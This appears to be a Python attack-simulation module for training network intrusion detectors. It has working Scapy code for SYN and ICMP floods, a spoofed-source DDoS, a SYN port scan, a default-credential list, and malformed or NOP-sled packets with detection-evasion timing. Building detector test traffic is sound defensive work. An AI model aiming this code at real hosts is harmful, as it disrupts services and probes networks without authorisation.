"""
Attack Simulation Framework
Generates various types of network attacks for testing and training
"""

import random
import time
import threading
import logging
import json
import numpy as np
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass
from datetime import datetime, timedelta
import ipaddress
import socket
import struct

try:
    from scapy.all import IP, TCP, UDP, ICMP, Raw, send, sr1
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logging.warning("Scapy not available. Attack simulation will be limited.")

@dataclass
class AttackScenario:
    """Defines an attack scenario"""
    name: str
    attack_type: str
    description: str
    target_ip: str
    target_port: Optional[int] = None
    duration_seconds: int = 60
    intensity: str = "medium"  # low, medium, high
    parameters: Dict[str, Any] = None
    
    def __post_init__(self):
        if self.parameters is None:
            self.parameters = {}

class AttackSimulator:
    """Generates various types of network attacks for testing"""
    
    def __init__(self, source_ip: str = None):
        self.logger = logging.getLogger(__name__)
        self.source_ip = source_ip or self.get_local_ip()
        
        # Attack statistics
        self.attack_stats = {}
        self.active_attacks = {}
        self.is_running = False
        
        # Attack patterns and signatures
        self.attack_patterns = {
            'dos': {
                'packet_rate': {'low': 100, 'medium': 1000, 'high': 10000},
                'packet_size': {'low': 64, 'medium': 512, 'high': 1500}
            },
            'ddos': {
                'source_count': {'low': 10, 'medium': 100, 'high': 1000},
                'packet_rate': {'low': 500, 'medium': 5000, 'high': 50000}
            },
            'port_scan': {
                'scan_rate': {'low': 10, 'medium': 100, 'high': 1000},
                'port_range': {'low': 100, 'medium': 1000, 'high': 65535}
            },
            'brute_force': {
                'attempt_rate': {'low': 1, 'medium': 10, 'high': 100},
                'duration': {'low': 60, 'medium': 300, 'high': 900}
            }
        }
    
    def get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            # Connect to a remote address to get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def generate_random_ip(self, exclude_networks: List[str] = None) -> str:
        """Generate a random IP address"""
        if exclude_networks is None:
            exclude_networks = ["127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
        
        while True:
            ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
            
            # Check if IP is in excluded networks
            is_excluded = False
            try:
                ip_obj = ipaddress.IPv4Address(ip)
                for network in exclude_networks:
                    if ip_obj in ipaddress.IPv4Network(network):
                        is_excluded = True
                        break
            except:
                is_excluded = True
            
            if not is_excluded:
                return ip
    
    def simulate_dos_attack(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Simulate DoS attack"""
        if not SCAPY_AVAILABLE:
            self.logger.error("Scapy not available. Cannot simulate DoS attack.")
            return {'success': False, 'error': 'Scapy not available'}
        
        attack_id = f"dos_{int(time.time())}"
        self.active_attacks[attack_id] = {
            'type': 'dos',
            'start_time': time.time(),
            'target': scenario.target_ip,
            'packets_sent': 0
        }
        
        try:
            intensity = scenario.parameters.get('intensity', scenario.intensity)
            packet_rate = self.attack_patterns['dos']['packet_rate'][intensity]
            packet_size = self.attack_patterns['dos']['packet_size'][intensity]
            
            start_time = time.time()
            packets_sent = 0
            
            while time.time() - start_time < scenario.duration_seconds:
                if not self.is_running:
                    break
                
                # Create malformed or high-volume packets
                if scenario.target_port:
                    # TCP SYN flood
                    packet = IP(dst=scenario.target_ip, src=self.source_ip) / \
                            TCP(dport=scenario.target_port, sport=random.randint(1024, 65535), flags="S")
                else:
                    # ICMP flood
                    packet = IP(dst=scenario.target_ip, src=self.source_ip) / \
                            ICMP() / Raw(load="A" * packet_size)
                
                send(packet, verbose=0)
                packets_sent += 1
                
                self.active_attacks[attack_id]['packets_sent'] = packets_sent
                
                # Control rate
                time.sleep(1.0 / packet_rate)
            
            # Clean up
            del self.active_attacks[attack_id]
            
            result = {
                'success': True,
                'attack_type': 'dos',
                'target': scenario.target_ip,
                'duration': time.time() - start_time,
                'packets_sent': packets_sent,
                'average_rate': packets_sent / (time.time() - start_time)
            }
            
            self.logger.info(f"DoS simulation completed: {result}")
            return result
            
        except Exception as e:
            self.logger.error(f"Error in DoS simulation: {e}")
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
            return {'success': False, 'error': str(e)}
    
    def simulate_ddos_attack(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Simulate DDoS attack with multiple source IPs"""
        if not SCAPY_AVAILABLE:
            self.logger.error("Scapy not available. Cannot simulate DDoS attack.")
            return {'success': False, 'error': 'Scapy not available'}
        
        attack_id = f"ddos_{int(time.time())}"
        
        try:
            intensity = scenario.parameters.get('intensity', scenario.intensity)
            source_count = self.attack_patterns['ddos']['source_count'][intensity]
            total_rate = self.attack_patterns['ddos']['packet_rate'][intensity]
            
            # Generate source IPs
            source_ips = [self.generate_random_ip() for _ in range(source_count)]
            
            self.active_attacks[attack_id] = {
                'type': 'ddos',
                'start_time': time.time(),
                'target': scenario.target_ip,
                'source_count': source_count,
                'packets_sent': 0
            }
            
            start_time = time.time()
            total_packets = 0
            
            # Distribute attack across multiple threads
            def ddos_worker(source_ip: str, rate_per_source: int):
                nonlocal total_packets
                packets_sent = 0
                
                while time.time() - start_time < scenario.duration_seconds:
                    if not self.is_running:
                        break
                    
                    # Create attack packet
                    if scenario.target_port:
                        packet = IP(dst=scenario.target_ip, src=source_ip) / \
                                TCP(dport=scenario.target_port, sport=random.randint(1024, 65535), flags="S")
                    else:
                        packet = IP(dst=scenario.target_ip, src=source_ip) / ICMP()
                    
                    send(packet, verbose=0)
                    packets_sent += 1
                    total_packets += 1
                    
                    time.sleep(1.0 / rate_per_source)
            
            # Start worker threads
            threads = []
            rate_per_source = max(1, total_rate // source_count)
            
            for source_ip in source_ips:
                thread = threading.Thread(target=ddos_worker, args=(source_ip, rate_per_source))
                thread.daemon = True
                threads.append(thread)
                thread.start()
            
            # Wait for completion
            for thread in threads:
                thread.join()
            
            # Clean up
            del self.active_attacks[attack_id]
            
            result = {
                'success': True,
                'attack_type': 'ddos',
                'target': scenario.target_ip,
                'duration': time.time() - start_time,
                'source_count': source_count,
                'packets_sent': total_packets,
                'average_rate': total_packets / (time.time() - start_time)
            }
            
            self.logger.info(f"DDoS simulation completed: {result}")
            return result
            
        except Exception as e:
            self.logger.error(f"Error in DDoS simulation: {e}")
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
            return {'success': False, 'error': str(e)}
    
    def simulate_port_scan(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Simulate port scanning attack"""
        if not SCAPY_AVAILABLE:
            self.logger.error("Scapy not available. Cannot simulate port scan.")
            return {'success': False, 'error': 'Scapy not available'}
        
        attack_id = f"portscan_{int(time.time())}"
        
        try:
            intensity = scenario.parameters.get('intensity', scenario.intensity)
            scan_rate = self.attack_patterns['port_scan']['scan_rate'][intensity]
            port_range = self.attack_patterns['port_scan']['port_range'][intensity]
            
            # Common ports to scan
            common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 
                          443, 993, 995, 1723, 3306, 3389, 5900, 8080]
            
            if port_range > len(common_ports):
                # Add random ports
                additional_ports = [random.randint(1, 65535) for _ in range(port_range - len(common_ports))]
                ports_to_scan = common_ports + additional_ports
            else:
                ports_to_scan = common_ports[:port_range]
            
            random.shuffle(ports_to_scan)
            
            self.active_attacks[attack_id] = {
                'type': 'port_scan',
                'start_time': time.time(),
                'target': scenario.target_ip,
                'ports_scanned': 0,
                'open_ports': []
            }
            
            start_time = time.time()
            ports_scanned = 0
            open_ports = []
            
            for port in ports_to_scan:
                if time.time() - start_time >= scenario.duration_seconds or not self.is_running:
                    break
                
                try:
                    # TCP SYN scan
                    packet = IP(dst=scenario.target_ip, src=self.source_ip) / \
                             TCP(dport=port, sport=random.randint(1024, 65535), flags="S")
                    
                    response = sr1(packet, timeout=0.1, verbose=0)
                    
                    if response and response.haslayer(TCP):
                        if response[TCP].flags == 18:  # SYN-ACK
                            open_ports.append(port)
                            # Send RST to close connection
                            rst_packet = IP(dst=scenario.target_ip, src=self.source_ip) / \
                                        TCP(dport=port, sport=packet[TCP].sport, flags="R")
                            send(rst_packet, verbose=0)
                    
                    ports_scanned += 1
                    self.active_attacks[attack_id]['ports_scanned'] = ports_scanned
                    self.active_attacks[attack_id]['open_ports'] = open_ports
                    
                    # Control scan rate
                    time.sleep(1.0 / scan_rate)
                    
                except Exception as e:
                    self.logger.debug(f"Error scanning port {port}: {e}")
                    continue
            
            # Clean up
            del self.active_attacks[attack_id]
            
            result = {
                'success': True,
                'attack_type': 'port_scan',
                'target': scenario.target_ip,
                'duration': time.time() - start_time,
                'ports_scanned': ports_scanned,
                'open_ports': open_ports,
                'scan_rate': ports_scanned / (time.time() - start_time)
            }
            
            self.logger.info(f"Port scan simulation completed: {result}")
            return result
            
        except Exception as e:
            self.logger.error(f"Error in port scan simulation: {e}")
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
            return {'success': False, 'error': str(e)}
    
    def simulate_brute_force_attack(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Simulate brute force login attack"""
        attack_id = f"bruteforce_{int(time.time())}"
        
        try:
            intensity = scenario.parameters.get('intensity', scenario.intensity)
            attempt_rate = self.attack_patterns['brute_force']['attempt_rate'][intensity]
            
            # Common credentials to try
            common_usernames = ['admin', 'administrator', 'root', 'user', 'guest', 'test']
            common_passwords = ['password', '123456', 'admin', 'password123', 'qwerty', '12345']
            
            self.active_attacks[attack_id] = {
                'type': 'brute_force',
                'start_time': time.time(),
                'target': scenario.target_ip,
                'attempts': 0,
                'successful': False
            }
            
            start_time = time.time()
            attempts = 0
            
            # Generate attack patterns (simulated login attempts)
            for username in common_usernames:
                for password in common_passwords:
                    if time.time() - start_time >= scenario.duration_seconds or not self.is_running:
                        break
                    
                    # Simulate login attempt (generate network traffic pattern)
                    if SCAPY_AVAILABLE and scenario.target_port:
                        # Create connection attempt
                        packet = IP(dst=scenario.target_ip, src=self.source_ip) / \
                                TCP(dport=scenario.target_port, sport=random.randint(1024, 65535), flags="S")
                        send(packet, verbose=0)
                    
                    attempts += 1
                    self.active_attacks[attack_id]['attempts'] = attempts
                    
                    # Log attempt
                    self.logger.debug(f"Brute force attempt {attempts}: {username}:{password}")
                    
                    # Control attempt rate
                    time.sleep(1.0 / attempt_rate)
                
                if time.time() - start_time >= scenario.duration_seconds or not self.is_running:
                    break
            
            # Clean up
            del self.active_attacks[attack_id]
            
            result = {
                'success': True,
                'attack_type': 'brute_force',
                'target': scenario.target_ip,
                'target_port': scenario.target_port,
                'duration': time.time() - start_time,
                'attempts': attempts,
                'attempt_rate': attempts / (time.time() - start_time)
            }
            
            self.logger.info(f"Brute force simulation completed: {result}")
            return result
            
        except Exception as e:
            self.logger.error(f"Error in brute force simulation: {e}")
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
            return {'success': False, 'error': str(e)}
    
    def simulate_zero_day_attack(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Simulate novel/zero-day attack patterns"""
        attack_id = f"zeroday_{int(time.time())}"
        
        try:
            self.active_attacks[attack_id] = {
                'type': 'zero_day',
                'start_time': time.time(),
                'target': scenario.target_ip,
                'packets_sent': 0
            }
            
            start_time = time.time()
            packets_sent = 0
            
            # Generate novel attack patterns
            attack_variants = [
                'timing_based_covert_channel',
                'protocol_anomaly',
                'payload_mutation',
                'steganographic_communication',
                'behavioral_mimicry'
            ]
            
            selected_variant = random.choice(attack_variants)
            
            while time.time() - start_time < scenario.duration_seconds:
                if not self.is_running:
                    break
                
                if SCAPY_AVAILABLE:
                    packet = self.generate_novel_packet(scenario.target_ip, selected_variant)
                    if packet:
                        send(packet, verbose=0)
                        packets_sent += 1
                
                # Variable timing to evade detection
                sleep_time = random.uniform(0.1, 2.0)
                time.sleep(sleep_time)
                
                self.active_attacks[attack_id]['packets_sent'] = packets_sent
            
            # Clean up
            del self.active_attacks[attack_id]
            
            result = {
                'success': True,
                'attack_type': 'zero_day',
                'variant': selected_variant,
                'target': scenario.target_ip,
                'duration': time.time() - start_time,
                'packets_sent': packets_sent
            }
            
            self.logger.info(f"Zero-day simulation completed: {result}")
            return result
            
        except Exception as e:
            self.logger.error(f"Error in zero-day simulation: {e}")
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
            return {'success': False, 'error': str(e)}
    
    def generate_novel_packet(self, target_ip: str, variant: str):
        """Generate novel attack packets based on variant"""
        if not SCAPY_AVAILABLE:
            return None
        
        try:
            base_packet = IP(dst=target_ip, src=self.source_ip)
            
            if variant == 'timing_based_covert_channel':
                # Use packet timing for covert communication
                packet = base_packet / ICMP(id=random.randint(1, 65535))
                
            elif variant == 'protocol_anomaly':
                # Create malformed protocol headers
                packet = base_packet / TCP(
                    dport=random.randint(1, 65535),
                    sport=random.randint(1024, 65535),
                    flags=random.randint(0, 255),  # Invalid flag combinations
                    window=0,
                    urgptr=65535
                )
                
            elif variant == 'payload_mutation':
                # Use mutated payloads to evade signature detection
                payload_patterns = [
                    b'\x90' * 100 + b'\xcc',  # NOP sled
                    b'A' * random.randint(100, 1000),  # Buffer overflow pattern
                    bytes([random.randint(0, 255) for _ in range(200)])  # Random data
                ]
                payload = random.choice(payload_patterns)
                packet = base_packet / TCP(dport=80, sport=random.randint(1024, 65535)) / Raw(load=payload)
                
            elif variant == 'steganographic_communication':
                # Hide data in packet fields
                hidden_data = "secret_command"
                packet = base_packet / ICMP() / Raw(load=hidden_data.encode())
                
            elif variant == 'behavioral_mimicry':
                # Mimic legitimate traffic patterns
                packet = base_packet / TCP(
                    dport=443,  # HTTPS
                    sport=random.randint(1024, 65535),
                    flags="PA"  # PSH+ACK
                ) / Raw(load=b'\x16\x03\x01' + bytes([random.randint(0, 255) for _ in range(100)]))
                
            else:
                packet = base_packet / ICMP()
            
            return packet
            
        except Exception as e:
            self.logger.error(f"Error generating novel packet: {e}")
            return None
    
    def run_attack_scenario(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Execute an attack scenario"""
        self.logger.info(f"Starting attack simulation: {scenario.name}")
        
        if scenario.attack_type == 'dos':
            return self.simulate_dos_attack(scenario)
        elif scenario.attack_type == 'ddos':
            return self.simulate_ddos_attack(scenario)
        elif scenario.attack_type == 'port_scan':
            return self.simulate_port_scan(scenario)
        elif scenario.attack_type == 'brute_force':
            return self.simulate_brute_force_attack(scenario)
        elif scenario.attack_type == 'zero_day':
            return self.simulate_zero_day_attack(scenario)
        else:
            return {'success': False, 'error': f'Unknown attack type: {scenario.attack_type}'}
    
    def start_simulation(self):
        """Start the attack simulation system"""
        self.is_running = True
        self.logger.info("Attack simulation system started")
    
    def stop_simulation(self):
        """Stop all running simulations"""
        self.is_running = False
        self.logger.info("Attack simulation system stopped")
    
    def get_active_attacks(self) -> Dict[str, Any]:
        """Get information about currently active attacks"""
        return dict(self.active_attacks)
    
    def create_attack_scenario_from_config(self, config: Dict[str, Any]) -> AttackScenario:
        """Create attack scenario from configuration"""
        return AttackScenario(
            name=config['name'],
            attack_type=config['type'],
            description=config.get('description', ''),
            target_ip=config['target_ip'],
            target_port=config.get('target_port'),
            duration_seconds=config.get('duration', 60),
            intensity=config.get('intensity', 'medium'),
            parameters=config.get('parameters', {})
        )
    
    def load_attack_scenarios(self, config_file: str) -> List[AttackScenario]:
        """Load attack scenarios from configuration file"""
        try:
            with open(config_file, 'r') as f:
                configs = json.load(f)
            
            scenarios = []
            for config in configs.get('scenarios', []):
                scenario = self.create_attack_scenario_from_config(config)
                scenarios.append(scenario)
            
            self.logger.info(f"Loaded {len(scenarios)} attack scenarios from {config_file}")
            return scenarios
            
        except Exception as e:
            self.logger.error(f"Error loading attack scenarios: {e}")
            return []
    
    def generate_training_data(self, num_samples: int = 1000, attack_types: List[str] = None) -> Tuple[np.ndarray, np.ndarray]:
        """Generate synthetic training data for various attack types"""
        if attack_types is None:
            attack_types = ['normal', 'dos', 'ddos', 'port_scan', 'brute_force', 'zero_day']
        
        # Feature dimensions: packet_size, duration, packet_rate, port, protocol, etc.
        num_features = 10
        
        X = []
        y = []
        
        samples_per_type = num_samples // len(attack_types)
        
        for i, attack_type in enumerate(attack_types):
            for _ in range(samples_per_type):
                if attack_type == 'normal':
                    # Normal traffic patterns
                    features = [
                        random.uniform(64, 1500),      # packet_size
                        random.uniform(0.1, 10),       # duration
                        random.uniform(1, 100),        # packet_rate
                        random.choice([80, 443, 22, 21, 25]),  # port
                        random.choice([6, 17, 1]),     # protocol (TCP, UDP, ICMP)
                        random.uniform(0, 0.1),        # anomaly_score
                        0,                             # port_scan_score
                        0,                             # ddos_score
                        random.uniform(0.1, 1.0),      # inter_arrival_time
                        random.uniform(100, 1400)      # payload_size
                    ]
                    label = 0  # Normal
                    
                elif attack_type == 'dos':
                    features = [
                        random.uniform(64, 1500),
                        random.uniform(10, 300),       # longer duration
                        random.uniform(1000, 10000),   # high packet rate
                        random.choice([80, 443, 22]),
                        6,  # TCP
                        random.uniform(0.7, 1.0),      # high anomaly score
                        0,
                        random.uniform(0.5, 1.0),      # ddos score
                        random.uniform(0.001, 0.01),   # very short inter-arrival
                        random.uniform(64, 200)        # small payload
                    ]
                    label = 1  # Attack
                    
                elif attack_type == 'port_scan':
                    features = [
                        random.uniform(64, 100),       # small packets
                        random.uniform(1, 60),
                        random.uniform(10, 1000),
                        random.randint(1, 65535),      # random ports
                        6,  # TCP
                        random.uniform(0.6, 0.9),
                        random.uniform(0.7, 1.0),      # high port scan score
                        0,
                        random.uniform(0.01, 0.1),
                        random.uniform(0, 50)          # minimal payload
                    ]
                    label = 1  # Attack
                    
                else:  # Other attack types
                    features = [
                        random.uniform(64, 1500),
                        random.uniform(1, 600),
                        random.uniform(100, 5000),
                        random.randint(1, 65535),
                        random.choice([6, 17, 1]),
                        random.uniform(0.5, 1.0),
                        random.uniform(0, 1.0),
                        random.uniform(0, 1.0),
                        random.uniform(0.001, 1.0),
                        random.uniform(0, 1500)
                    ]
                    label = 1  # Attack
                
                X.append(features)
                y.append(label)
        
        return np.array(X), np.array(y)